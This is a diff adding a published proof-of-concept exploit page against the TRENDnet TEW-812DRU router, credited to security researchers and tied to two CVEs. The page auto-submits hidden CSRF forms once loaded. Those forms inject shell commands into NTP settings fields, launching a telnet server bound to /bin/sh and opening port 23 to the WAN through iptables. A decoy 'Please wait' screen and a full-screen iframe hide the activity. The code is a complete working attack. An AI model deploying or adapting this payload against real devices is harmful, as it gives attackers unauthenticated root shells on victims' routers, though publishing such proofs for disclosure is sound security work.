@@ -1,0 +1,133 @@
+<html>
+<head>
+<title> TRENDnet TEW-812DRU CSRF - Command Injection > Shell Exploit.</title>
+<!--
+# CSRF Discovered by: Jacob Holcomb - Security Analyst @ Independent Security Evaluators
+# Command Injection(s) Discovered by: Jacob Holcomb & Kedy Liu - Security Analysts @ Independent Security Evaluators 
+# Exploited by: Jacob Holcomb - Security Analyst @ Independnet Security Evaluators
+# CVE: CSRF - CVE-2013-3098 & Multiple Command Injection - CVE-2013-3365 
+# http://infosec42.blogspot.com
+# http://securityevaluators.com
+-->
+</head>
+<body>
+<img src="http://192.168.10.1/Images/logo.gif"><!--TRENDnet Logo for attack launch page -->
+<h1>Please wait... </h1>
+<script type="text/javascript">
+//Request to enable port forwarding to the routers internal IP on port 23
+//This exploit works without this request, but the exploit was more stable with it, so its included in thos PoC.
+function RF1(){
+    document.write('<form name="portfwd" target ="_blank" action="http://192.168.10.1/uapply.cgi" method="post">'+
+    '<input type="hidden" name="page" value="/advanced/single_port.asp">'+
+    '<input type="hidden" name="forward_port_enable" value="0">'+
+    '<input type="hidden" name="forward_port" value="24">'+
+    '<input type="hidden" name="forward_port_proto0" value="tcp">'+
+    '<input type="hidden" name="forward_port_from_start0" value="23">'+
+    '<input type="hidden" name="forward_port_from_end0" value="23">'+
+    '<input type="hidden" name="forward_port_to_ip0" value="192.168.10.1">'+
+    '<input type="hidden" name="forward_port_to_start0" value="23">'+
+    '<input type="hidden" name="forward_port_to_end0" value="23">'+
+    '<input type="hidden" name="schedule0" value="0">'+
+    '<input type="hidden" name="forward_port_enable0" value="on">'+
+    '<input tpye="hidden" name="action" value="Apply">'+
+    '</form>');
+}
+
+//Request to enable telnet
+function RF2(){
+    document.write('<form name="enable23" target="_blank" action="http://192.168.10.1/setNTP.cgi" method="post">'+
+    '<input type="hidden" name="page" value="/adm/time.asp">'+
+    '<input type="hidden" name="DSTenable" value="on">'+
+    '<input type="hidden" name="NtpDstEnable" value="1">'+
+    '<input type="hidden" name="NtpDstOffset" value="`utelnetd -l /bin/sh`">'+
+    '<input type="hidden" name="NtpDstStart" value="030102">'+
+    '<input type="hidden" name="tz_daylight_start_month_select" value="03">'+
+    '<input type="hidden" name="tz_daylight_start_day_select" value="01">'+
+    '<input type="hidden" name="tz_daylight_start_time_select" value="02">'+
+    '<input type="hidden" name="NtpDstEnd" value="100102">'+
+    '<input type="hidden" name="tz_daylight_end_month_select" value="10">'+
+    '<input type="hidden" name="tz_daylight_end_day_select" value="01">'+
+    '<input type="hidden" name="tz_daylight_end_time_select" value="02">'+
+    '<input type="hidden" name="ntp_server" value="1">'+
+    '<input type="hidden" name="NTPServerIP" value="pool.ntp.org">'+
+    '<input type="hidden" name="time_zone" value="UCT_-11">'+
+    '<input type="hidden" name="timer_interval" value="300">'+
+    '<input type="hidden" name="manual_year_select" value="2012">'+
+    '<input type="hidden" name="manual_month_select" value="01">'+
+    '<input type="hidden" name="manual_day_select" value="01">'+
+    '<input type="hidden" name="manual_hour_select" value="00">'+
+    '<input type="hidden" name="manual_min_select" value="19">'+
+    '<input type="hidden" name="manual_sec_select" value="57">'+
+    '<input type="hidden" name="timeTag" value="manual">'+
+    '</form>');
+}
+
+//Request to change iptables to allow port 23 from the WAN.
+function RF3(){
+    document.write(
+    '<form name="ipTableRule" target="_blank" action="http://192.168.10.1/setNTP.cgi" method="post">'+
+    '<input type="hidden" name="page" value="/adm/time.asp">'+
+    '<input type="hidden" name="DSTenable" value="on">'+
+    '<input type="hidden" name="NtpDstEnable" value="1">'+
+    '<input type="hidden" name="NtpDstOffset" value="3600">'+
+    '<input type="hidden" name="NtpDstStart" value="030102">'+
+    '<input type="hidden" name="tz_daylight_start_month_select" value="03">'+
+    '<input type="hidden" name="tz_daylight_start_day_select" value="01">'+
+    '<input type="hidden" name="tz_daylight_start_time_select" value="02">'+
+    '<input type="hidden" name="NtpDstEnd" value="`count=0;while [ $count -le 25 ]; do iptables -I INPUT 1 -p tcp --dport 23 -j ACCEPT;(( count++ ));done;`">'+
+    '<input type="hidden" name="tz_daylight_end_month_select" value="10">'+
+    '<input type="hidden" name="tz_daylight_end_day_select" value="01">'+
+    '<input type="hidden" name="tz_daylight_end_time_select" value="02">'+
+    '<input type="hidden" name="ntp_server" value="1">'+
+    '<input type="hidden" name="NTPServerIP" value="pool.ntp.org">'+
+    '<input type="hidden" name="time_zone" value="UCT_-11">'+
+    '<input type="hidden" name="timer_interval" value="300">'+
+    '<input type="hidden" name="manual_year_select" value="2012">'+
+    '<input type="hidden" name="manual_month_select" value="01">'+
+    '<input type="hidden" name="manual_day_select" value="01">'+
+    '<input type="hidden" name="manual_hour_select" value="00">'+
+    '<input type="hidden" name="manual_min_select" value="19">'+
+    '<input type="hidden" name="manual_sec_select" value="57">'+
+    '<input type="hidden" name="timeTag" value="manual">'+
+    '</form>');
+}
+
+function createPage(){
+    RF1();
+    RF2();
+    RF3();
+    document.write('<iframe src="http://192.168.10.1/" target="_blank" width="100%" height="100%" frameborder="0" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0;"></iframe>');
+}
+
+function _portfwd(){
+    document.portfwd.submit();
+}
+
+function _enable23(){
+    document.enable23.submit();
+}
+
+function _ipTableRule(){
+    document.ipTableRule.submit();i
+}
+
+//Called Functions
+createPage()
+    
+for(var i = 0; i < 3; i++){
+    if(i == 0){
+        window.setTimeout(_portfwd, 1000);
+    }
+    else if(i == 1){
+        window.setTimeout(_enable23, 2000);
+    }
+    else if(i == 2){
+        window.setTimeout(_ipTableRule, 4000);
+    }
+    else{
+        continue;
+    }
+}
+</script>
+</body>
+</html>
